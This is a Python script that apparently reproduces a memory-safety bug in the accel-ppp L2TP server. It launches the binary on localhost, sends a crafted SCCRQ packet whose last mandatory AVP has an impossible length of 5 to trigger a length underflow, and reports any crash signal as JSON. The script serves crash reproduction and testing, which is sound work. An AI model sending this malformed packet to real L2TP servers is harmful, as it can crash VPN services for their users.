#!/usr/bin/env python3
import argparse
import json
import os
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time


L2TP_PORT = 1701
MAX_CAPTURE = 65536


def truncate_text(value, limit=MAX_CAPTURE):
    if len(value) <= limit:
        return value
    return value[:limit] + "\n...[truncated]..."


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return "SIG%d" % (-returncode)


def install_root_for(binary):
    binary_dir = os.path.dirname(os.path.abspath(binary))
    return os.path.abspath(os.path.join(binary_dir, os.pardir))


def build_config():
    return """\
[modules]
path=lib64/accel-ppp
l2tp

[core]
log-error=/dev/stderr
thread-count=1

[ppp]
verbose=1
min-mtu=1280
mtu=1400
mru=1400
ipv4=deny
ipv6=deny
lcp-echo-interval=0

[l2tp]
verbose=1
bind=127.0.0.1
port=1701
host-name=poc
"""


def u16(value):
    return struct.pack("!H", value & 0xffff)


def u32(value):
    return struct.pack("!I", value & 0xffffffff)


def avp(vendor, attr_type, value=b"", mandatory=True, hidden=False, length=None):
    avp_len = 6 + len(value) if length is None else length
    flags = (0x8000 if mandatory else 0) | (0x4000 if hidden else 0) | (avp_len & 0x03ff)
    return u16(flags) + u16(vendor) + u16(attr_type) + value


def build_payload():
    avps = b"".join(
        [
            avp(0, 0, u16(1)),            # Message Type: SCCRQ
            avp(0, 2, b"\x01\x00"),      # Protocol Version: 1.0
            avp(0, 3, u32(1)),           # Framing Capabilities
            avp(0, 7, b"poc"),           # Host Name
            avp(0, 9, u16(0x4000)),      # Assigned Tunnel ID
            # Malformed mandatory AVP: advertised length is smaller than the
            # AVP header. Vulnerable parsers can underflow while normalizing
            # the value length or advancing to the next AVP.
            avp(0, 0, b"", mandatory=True, length=5),
        ]
    )
    flags_version = 0xC802  # control, length present, sequence present, version 2
    total_len = 12 + len(avps)
    header = b"".join(
        [
            u16(flags_version),
            u16(total_len),
            u16(0),  # Tunnel ID
            u16(0),  # Session ID
            u16(0),  # Ns
            u16(0),  # Nr
        ]
    )
    return header + avps


def proc_udp_port_bound(port):
    hex_port = ("%04X" % port).upper()
    paths = ("/proc/net/udp", "/proc/net/udp6")
    for path in paths:
        try:
            with open(path, "r", encoding="ascii", errors="replace") as f:
                rows = f.readlines()[1:]
        except OSError:
            continue
        for row in rows:
            parts = row.split()
            if len(parts) < 2 or ":" not in parts[1]:
                continue
            _, local_port = parts[1].rsplit(":", 1)
            if local_port.upper() == hex_port:
                return True
    return False


def wait_for_udp_bind(proc, port, seconds):
    deadline = time.monotonic() + max(0.0, seconds)
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        if proc_udp_port_bound(port):
            return True
        time.sleep(0.05)
    return proc.poll() is None


def send_trigger():
    payload = build_payload()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(1.0)
        sock.sendto(payload, ("127.0.0.1", L2TP_PORT))


def terminate_process_group(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(proc.pid, signal.SIGTERM)
    except ProcessLookupError:
        return
    except OSError:
        proc.terminate()
    try:
        proc.wait(timeout=1.0)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except OSError:
            proc.kill()


def run(binary, timeout):
    started = time.monotonic()
    stdout = ""
    stderr = ""
    returncode = None
    timed_out = False
    error = None
    command = None

    try:
        binary_abs = os.path.abspath(binary)
        root = install_root_for(binary_abs)
        module_dir = os.path.join(root, "lib64", "accel-ppp")
        command = [binary_abs, "--no-sigsegv", "-c", ""]

        with tempfile.TemporaryDirectory(prefix="accel-ppp-poc-") as tmpdir:
            config_path = os.path.join(tmpdir, "accel-ppp.conf")
            with open(config_path, "w", encoding="ascii") as f:
                f.write(build_config())
            command = [binary_abs, "--no-sigsegv", "-c", config_path]

            env = os.environ.copy()
            ld_entries = [module_dir, os.path.join(root, "lib64")]
            existing_ld = env.get("LD_LIBRARY_PATH")
            if existing_ld:
                ld_entries.append(existing_ld)
            env["LD_LIBRARY_PATH"] = os.pathsep.join(ld_entries)

            proc = subprocess.Popen(
                command,
                cwd=root if os.path.isdir(root) else None,
                env=env,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
            )

            startup_budget = min(2.0, max(0.1, timeout * 0.25))
            if wait_for_udp_bind(proc, L2TP_PORT, startup_budget):
                try:
                    send_trigger()
                except OSError as exc:
                    error = "failed to send trigger: %s" % exc

            elapsed = time.monotonic() - started
            remaining = max(0.0, timeout - elapsed)
            try:
                out_b, err_b = proc.communicate(timeout=remaining)
            except subprocess.TimeoutExpired:
                timed_out = True
                terminate_process_group(proc)
                out_b, err_b = proc.communicate(timeout=1.0)

            returncode = proc.returncode
            stdout = out_b.decode("utf-8", errors="replace")
            stderr = err_b.decode("utf-8", errors="replace")

    except Exception as exc:
        error = str(exc)

    runtime_ms = int((time.monotonic() - started) * 1000)
    stdout = truncate_text(stdout)
    stderr = truncate_text(stderr)
    combined = truncate_text(stdout + stderr)
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "combined_output",
            "value": combined,
            "path": None,
        },
        "error": error,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    result = run(args.binary, args.timeout)
    encoded = json.dumps(result, indent=2, sort_keys=False)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as f:
            f.write(encoded + "\n")
    else:
        print(encoded)


if __name__ == "__main__":
    main()
